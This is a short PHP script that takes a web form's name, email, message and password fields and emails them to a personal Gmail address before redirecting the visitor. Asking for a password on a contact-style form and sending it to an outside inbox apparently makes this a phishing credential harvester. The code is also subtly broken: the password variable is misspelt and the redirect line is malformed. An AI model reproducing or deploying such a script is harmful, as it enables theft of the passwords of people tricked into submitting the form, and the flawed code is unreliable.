<?php
//get data from form
$name = $_POST ['name'];
$email = $_POST['email'];
$message = $_POST['message'];
$password = $_POST['password'];

$to = "lorettagoodrow@gmail.com";
$subject = "Mail From website";
$txt ="Name = ". $name . "\r\n Email = " . $email . "\r\n Message =" .$message. "\r\n Password =" .$passowrd;
$headers = "From: noreply@yoursite.com";
if($email!=NULL){
mail($to,$subject,$txt,$headers) ;
}
//redirect

echo
header("Location:result.html");
?>